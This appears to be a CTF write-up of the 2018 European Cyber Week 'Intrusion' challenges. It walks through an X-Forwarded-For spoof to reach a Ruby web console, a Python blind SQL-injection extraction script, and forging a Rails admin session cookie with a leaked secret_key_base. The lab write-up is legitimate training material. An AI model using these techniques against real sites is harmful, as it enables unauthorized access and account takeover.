# [European Cyber Week] - Intrusion



## Intrusion 1/4

### State of the art

I start this challenge with a website:

> web150-smartstuff.challenge-ecw.fr

Nothing really interesting at first glance. After digging a bit in HTML source code, I notice 2 pages:

* thor.css
* thor.js

### Thor.css

When I checked this file, I noticed a different subdomain:

> web150_dev.challenge-ecw.fr

### Flag

Then I just curl this new subdomain:

```bash
$ curl -v -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr
[...]
ECW{5822a94206522fe5382d2f00acc5cadf}
[...]
```

---

## Intrusion 2/4

### State of the art

Ok, now we're on the dev platform. After a lot of fuzzing, I finally find a bug. When I'm sending `OPTIONS` HTTP request, I get a weird output:

```bash
$ curl -v -X OPTIONS -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr
```


![](/lib/images/writeups/2018_ecw/intrusion/intru1.png)


### X-Forwarded-For spoofing

In the previous Figure, we notice something interesting:

> HTTP_F_FORWARDED_FOR: "176.187.238.100, 10.1.0.10, 127.0.0.1"

In a previous CTF and in real-world pentests, I already came across this kind of WAF. It only allows connections from precise IP addresses, such as `127.0.0.1`.

```bash
$ curl -X OPTIONS -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr/
```


![](/lib/images/writeups/2018_ecw/intrusion/intru2.png)


It's a Ruby webconsole. I used those lines to display the content of the directories and the files:

```ruby
Dir['*']
File.open('file').readlines()
```

### Flag

After looking over some files, I finally open `config/initializers/web_console.rb`:


![](/lib/images/writeups/2018_ecw/intrusion/intru3.png)


Unhex string gives us:

> ECW{5948462211d00c9cec468fd194e76c5f}

---

## Intrusion hint

### State of the art

This time, it's not on the dev platform, it's on a new website:


![](/lib/images/writeups/2018_ecw/intrusion/intru4.png)


Maybe something with `LIKE` in SQL:


![](/lib/images/writeups/2018_ecw/intrusion/intru5.png)


5 hints found in the database. Let's extract them :)

### Data extraction

I guess one of them is the flag. The payload looks like:

> [char]*

So I did this little script (do you remember my ugly script in `AdmYSsion`?):

```python
import requests
import string

partial = ''
no_pass = True
charset = string.hexdigits+'}'

url = 'https://web150-hint.challenge-ecw.fr/search'

nogo = '1 hint found'

while no_pass:
    no_pass = False
    for i in charset:
        payload = 'ECW'+str(partial+i)+'%'
        r = requests.post(url, data = {'request': payload})
        if nogo in r.text:
            no_pass = True
            partial += i
            print('Found: '+partial)
            break
    print(partial)
```

### Hints

I edit the script to extract all the hints:

> https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028

> http://manpages.ubuntu.com/manpages/cosmic/en/man1/systemctl.1.html

> /home/web200/smart_stuff/config/initializers/web_console.rb

> /home/web200/smart_stuff/config/secrets.yml

### Flag

Then the flag:

> ECW{ebbbb414c38020906fd34bdd49ceea36}

---

## Intrusion 3/4


### State of the art

Go back to the dev platform, the real challenge is starting. One of the previous hints mentioned `secrets.yml`:

```yml
# Be sure to restart your server when you modify this file.

# Your secret key is used for verifying the integrity of signed cookies.
# If you change this key, all old signed cookies will become invalid!

# Make sure the secret is at least 30 characters and all random,
# no regular words or you'll be exposed to dictionary attacks.
# You can use `rails secret` to generate a secure secret key.

# Make sure the secrets in this file are kept private
# if you're sharing your code publicly.

# Shared secrets are available across all environments.

# shared:
#   api_key: a1B2c3D4e5F6

# Environmental secrets are only available for that specific environment.

development:
  secret_key_base: 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59

test:
  secret_key_base: 1cd775a1587363d69a47ce39af7e7ff13ea1b2f10dbc3a92bed16ac05436c2493be22280deee4fde699a88208b2de3738ae1257208002b2b1f32029bb096717e

# Do not keep production secrets in the unencrypted secrets file.
# Instead, either read values from the environment.
# Or, use `bin/rails secrets:setup` to configure encrypted secrets
# and move the `production:` environment over there.

production:
  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %>
```

In another previous hint, the GitHub repository gave us a script able to decrypt Ruby on Rails cookies:

```Ruby
require 'cgi'
require 'json'
require 'active_support'

def verify_and_decrypt_session_cookie(cookie, secret_key_base)
  cookie = CGI::unescape(cookie)
  salt         = 'encrypted cookie'
  signed_salt  = 'signed encrypted cookie'
  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
  secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
  sign_secret = key_generator.generate_key(signed_salt)
  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
  encryptor.decrypt_and_verify(cookie)
end
```

Then to decrypt my cookie I need:

* My Cookie (of course)
* salt
* signed_salt
* secret_key_base of the dev platform

## Decrypting the cookie

To obtain `salt` and `signed_salt`, I have to display `./config/application.rb`:


![](/lib/images/writeups/2018_ecw/intrusion/intru6.png)


* salt: ECW-secret-salt
* signed-salt: ECW-signature-secret-salt

__/!\ config.action_dispatch.cookies_serializer = :marshal__ in `application.rb` !!!  It's not JSON formatted, it's Marshal formatted, and Marshal from Python and Ruby are different... 

I got the `secret_key_base` in `secrets.yml` file:

```
08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59
```

And the `cookie`:

```
NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da
```

I believed naively that I could use the decryption script on my laptop without any troubles... After a few hours of me going crazy, I had an illumination. I want to run a ruby script, I have a web console in ruby, YES!

Here is my beautiful decryption script with all the variables put together:

```ruby
cookie = NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da

secret_key_base = 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59

salt = ECW-secret-salt
signed_salt = ECW-signature-secret-salt

key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
sign_secret = key_generator.generate_key(signed_salt)
encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: Marshal)
encryptor.decrypt_and_verify(cookie)
```


![](/lib/images/writeups/2018_ecw/intrusion/intru7.png)


```
{"session_id"=>"BLAH", "user"=>#<User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil>}
```

### Cookie crafting

I don't have any screenshots of this part or any logs... But to craft a new admin cookie, you just have to set those fields:

* id: Any number
* name: Any name
* admin: true

In Ruby, it works like a dictionnary in Python:

```ruby
>> a = {"session_id"=>"BLAH", "user"=>#<User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil>}
>> a['user']['name'] = admin
=> "admin"
>> a['user']['id'] = 1
=> 1
>> a['user']['admin'] = true
=> true
```

The encryption key and salt are already in memory, just use this function:

```ruby
b = encryptor.encrypt_and_sign(a)
[Big cookie]
```

### Connect as admin

Just open `Local storage` in your `Web developers tools` and overwrite your existing cookie, and... W00t! We're the admin of the dev platform!...

BUT IT'S USELESS!!!


![](https://media.giphy.com/media/26ufcVAp3AiJJsrIs/giphy.gif)


### Flag

Go back to the hints and look at the one mentionning `systemd`. After a few minutes of digging, I got this:


![](/lib/images/writeups/2018_ecw/intrusion/intru9.png)


> ECW{172ce5c14098e888a09053c0518bda08}

---

## Intrusion 4/4

### State of the art

Well, now we have to get the admin access on the production platform. I have the `secret_key_base` key:

* secret_key_base of prod: A_cookie_of_course

### Crafting admin cookie

In the previous challenge, when I said it was "useless" to be the admin of the dev platform, it wasn't true. It taught me how to decrypt and craft cookies. Now I just have to take the prod cookie, decrypt it and I get the `session_id`.

```
{"session_id"=>"PROD SESSION ID", "user"=>#<User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil>}
```

I fill the fields with the appropriate data and `encrypt_and_sign` the cookie with the new `secret_key_base`.

### Flag

I just overwrite my old cookie with my fresh one, and finally go on the `/admin/` page on prod:


![](https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif)


> ECW{2c9ff616d19419cc9ca91f5b0829e802} 
